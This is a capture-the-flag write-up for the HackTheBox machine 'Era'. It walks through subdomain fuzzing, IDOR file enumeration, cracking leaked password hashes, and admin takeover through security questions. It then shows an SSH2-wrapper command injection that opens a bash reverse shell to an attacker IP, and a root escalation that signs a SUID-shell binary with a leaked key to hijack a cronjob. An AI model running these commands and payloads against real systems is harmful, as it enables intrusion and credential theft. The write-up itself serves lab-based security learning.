# Era

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.79:21
Open 10.10.11.79:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.79

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.5
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## Port 80

Main website is just landing page with `index.html`, no outgoing links or anything.

![Writeup.png](/assets/pentest/htb/era/Writeup.png)

### File Sharing

Enumerate subdomains
```bash
└─$ domain='era.htb'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fl 8
file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 149ms]
:: Progress: [19966/19966] :: Job [1/1] :: 564 req/sec :: Duration: [0:01:05] :: Errors: 0 ::
```

All paths require authorization. If we go to Sign In the url is [http://file.era.htb/login.php](http://file.era.htb/login.php)

![Writeup-1.png](/assets/pentest/htb/era/Writeup-1.png)

#### Login Bypass

If we change `login` to `register` -> [http://file.era.htb/register.php](http://file.era.htb/register.php) we can register

![Writeup-2.png](/assets/pentest/htb/era/Writeup-2.png)

### IDOR

If we upload something we are given following link: [http://file.era.htb/download.php?id=6854](http://file.era.htb/download.php?id=6854)

![Writeup-3.png](/assets/pentest/htb/era/Writeup-3.png)

After resetting the box the results were much lower..
```bash
└─$ ffuf -u "http://file.era.htb/download.php?id=FUZZ" -b 'PHPSESSID=d3apcamim6cehfcg377j709pkf' -w <(seq 0 10000) -mc all -fl 267
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 74ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 83ms]
:: Progress: [10001/10001] :: Job [1/1] :: 380 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

Get files
```bash
└─$ curl -b 'PHPSESSID=d3apcamim6cehfcg377j709pkf' 'http://file.era.htb/download.php?id=54&dl=true' -so site-backup-30-08-24.zip
└─$ curl -b 'PHPSESSID=d3apcamim6cehfcg377j709pkf' 'http://file.era.htb/download.php?id=150&dl=true' -so signing.zip
```

## Source

### Signing

View source
```bash
└─$ 7z x signing.zip -o"signing"
└─$ 7z x site-backup-30-08-24.zip -o"backup"
```

Potential username: `yurivich@era.com`

![Writeup-4.png](/assets/pentest/htb/era/Writeup-4.png)

```bash
└─$ openssl x509 -in signing/key.pem -text -noout | grep -v ':..:'
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: O=Era Inc., CN=ELF verification, emailAddress=yurivich@era.com
        Validity
        Subject: O=Era Inc., CN=ELF verification, emailAddress=yurivich@era.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    68:bf
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Key Usage:
                Digital Signature
            X509v3 Subject Key Identifier:
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
```

### Backup

There's hashes in the database:
```bash
└─$ sqlite3 backup/filedb.sqlite 'SELECT CONCAT(user_name,":",user_password) FROM users' # --box
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

Crack the passwords
```powershell
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
eric:america
yuri:mustang
```

We have credentials, but to FTP not SSH.

Dump for later
```bash
└─$ wget -r ftp://yuri:mustang@era.htb/
└─$ tree
.
├── apache2_conf
│   ├── 000-default.conf
│   ├── apache2.conf
│   ├── file.conf
│   └── ports.conf
└── php8.1_conf
    ├── build
    │   ├── ax_check_compile_flag.m4
    │   ├── ax_gcc_func_attribute.m4
    │   ├── gen_stub.php
    │   ├── Makefile.global
    │   ├── php_cxx_compile_stdcxx.m4
    │   ├── phpize.m4
    │   ├── php.m4
    │   └── run-tests.php
    ├── calendar.so
    ├── ctype.so
    ├── dom.so
    ├── exif.so
    ├── ffi.so
    ├── fileinfo.so
    ├── ftp.so
    ├── gettext.so
    ├── iconv.so
    ├── opcache.so
    ├── pdo.so
    ├── pdo_sqlite.so
    ├── phar.so
    ├── posix.so
    ├── readline.so
    ├── shmop.so
    ├── simplexml.so
    ├── sockets.so
    ├── sqlite3.so
    ├── ssh2.so
    ├── sysvmsg.so
    ├── sysvsem.so
    ├── sysvshm.so
    ├── tokenizer.so
    ├── xmlreader.so
    ├── xml.so
    ├── xmlwriter.so
    ├── xsl.so
    └── zip.so
```

### Admin View

There's some funky stuff going on in the source code. If there's a user `erauser`
- Admin users can "showcase" files instead of downloading them
- The `format` parameter gets prepended to the filename as a "wrapper"
- If `format` contains `://`, it's treated as a protocol wrapper

![Writeup-5.png](/assets/pentest/htb/era/Writeup-5.png)

The user `erauser` doesn't exist, but if registered and then viewed [http://file.era.htb/download.php?id=150&show=true](http://file.era.htb/download.php?id=150&show=true) nothing happens. Most probably because this is a backup and production code doesn't allow `erauser`, but admins.

First update security question for admin user. Why can you specify username in this form? Good question.

![Writeup-6.png](/assets/pentest/htb/era/Writeup-6.png)

Logout -> Use security questions to login as `admin_ef01cab31aa` 

Now it's working

![Writeup-7.png](/assets/pentest/htb/era/Writeup-7.png)

There's few limitation tho. We can read files only in `files/`, cannot go outside (`basename` removes any `../`) and cannot execute code with Phar since there are no vulnerable objects.

## SSRF -> RCE

From FTP we know that some modules are loaded, like [https://www.php.net/manual/en/book.ssh2.php](https://www.php.net/manual/en/book.ssh2.php)

It can also be used as a wrapper [https://www.php.net/manual/en/wrappers.ssh2.php](https://www.php.net/manual/en/wrappers.ssh2.php)

```bash
ssh2.exec://yuri:mustang@0:22/curl 10.10.14.56
```

The command is successful.

![Writeup-8.png](/assets/pentest/htb/era/Writeup-8.png)

### Reverse Shell (yuri)

```bash
└─$ curl -G -b 'PHPSESSID=d3apcamim6cehfcg377j709pkf' 'http://file.era.htb/download.php?id=150&show=true' --data-urlencode 'format=ssh2.exec://yuri:mustang@127.0.0.1:22//bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.56/4444 0>&1";'
```

```bash
(remote) yuri@era:/home/yuri$ id
uid=1001(yuri) gid=1002(yuri) groups=1002(yuri)
# No user.txt
(remote) yuri@era:/home/yuri$ ls ..
eric  yuri
```

## Privilege Escaltation (eric)

I didn't even try to authenticate as `eric` on FTP since `yuri` worked, turns out we couldn't access FTP with `eric`, however it works as a local `su`

```bash
(remote) yuri@era:/home/yuri$ su - eric
Password: america
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

### User.txt

```bash
eric@era:~$ cat user.txt
34bf5e6b9f9f16cf1501ace3796c07d8
```

## Privilege Escalation (root)

There's something in `/opt`
```bash
eric@era:/opt/AV$ find . -type f -ls
    74573     20 -rwxrw----   1 root     devs        16544 Jul 28 16:07 ./periodic-checks/monitor
    74572      4 -rw-rw----   1 root     devs          205 Jul 28 16:07 ./periodic-checks/status.log
```

After some time I read `status.log` again and it had different output, meaning it's a cronjob (probably as root since it's AV related).

Download binary
```bash
eric@era:/opt/AV/periodic-checks$ python -m http.server
---
└─$ curl era.htb:8000/monitor -sO
```

It just sleeps?...

![Writeup-9.png](/assets/pentest/htb/era/Writeup-9.png)

We have write/execute permissions over directory, delete the file, create new file, make it executable, wait for profit.
```bash
eric@era:/opt/AV/periodic-checks$ cp monitor monitor.bak
eric@era:/opt/AV/periodic-checks$ rm monitor
eric@era:/opt/AV/periodic-checks$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > monitor
eric@era:/opt/AV/periodic-checks$ chmod 777 monitor
# After long wait nothing...
## Repeat steps +
eric@era:/opt/AV/periodic-checks$ chown eric:devs monitor
# Still nothing
```

Welp that didn't work as intended

If we scan with **pspy** we see cronjob executing, however our binary not executing. The `status.log` actually has errors.
```bash
eric@era:/opt/AV/periodic-checks$ ./pspy &
2025/07/28 16:23:01 CMD: UID=0     PID=7822   | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
2025/07/28 16:23:01 CMD: UID=0     PID=7823   | bash -c /root/initiate_monitoring.sh
2025/07/28 16:23:01 CMD: UID=0     PID=7824   | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
2025/07/28 16:23:01 CMD: UID=0     PID=7825   | /bin/bash /root/initiate_monitoring.sh

eric@era:/opt/AV/periodic-checks$ cat status.log
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

```bash
eric@era:/tmp$ rm /opt/AV/periodic-checks/monitor -
eric@era:/tmp$ echo 'main(){system("install -m4777 /bin/bash /tmp/rootbash");}' | gcc -xc -o /opt/AV/periodic-checks/monitor -

eric@era:/opt/AV/periodic-checks$ cat status.log
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig' - it does not exist: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig' - it does not exist: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

**[linux-elf-binary-signer](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)**: ✒️ Adding digital signature into ELF binary files.

```bash
└─$ git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
└─$ sudo apt install libssl-dev openssl binutils -y
└─$ cd linux-elf-binary-signer
└─$ make
└─$ ./elf-sign -h
Usage: elf-sign [-h] <hash-algo> <key> <x509> <elf-file> [<dest-file>]
  -h,         display the help and exit

Sign the <elf-file> to an optional <dest-file> with
private key in <key> and public key certificate in <x509>
and the digest algorithm specified by <hash-algo>. If no
<dest-file> is specified, the <elf-file> will be backup to
<elf-file>.old, and the original <elf-file> will be signed.
# Optional
└─$ sudo mv elf-sign /usr/bin
```

Sign the binary
```bash
└─$ echo $'#include <stdlib.h>\nvoid main(){system("install -m4777 /bin/bash /tmp/rootbash");}' | gcc -static -xc -o monitor -
└─$ elf-sign sha256 ./signing/key.pem ./signing/key.pem ./monitor ./monitor_signed
 --- 64-bit ELF file, version 1 (CURRENT), little endian.
 --- 26 sections detected.
 --- Section 0006 [.text] detected.
 --- Length of section [.text]: 486137
 --- Signature size of [.text]: 458
 --- Writing signature to file: .text_sig
 --- Removing temporary signature file: .text_sig
```

```
eric@era:/opt/AV/periodic-checks$ rm /opt/AV/periodic-checks/
eric@era:/opt/AV/periodic-checks$ curl 10.10.14.56/monitor_signed -o /opt/AV/periodic-checks/monitor
eric@era:/opt/AV/periodic-checks$ chmod 777 /opt/AV/periodic-checks/monitor
```

```bash
eric@era:/opt/AV/periodic-checks$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(eric) gid=1000(eric) euid=0(root) groups=1000(eric),1001(devs)
```

### Root.txt

```bash
rootbash-5.1# cat /root/root.txt
7f34477f678daf83ceff4c6ed3e69572
```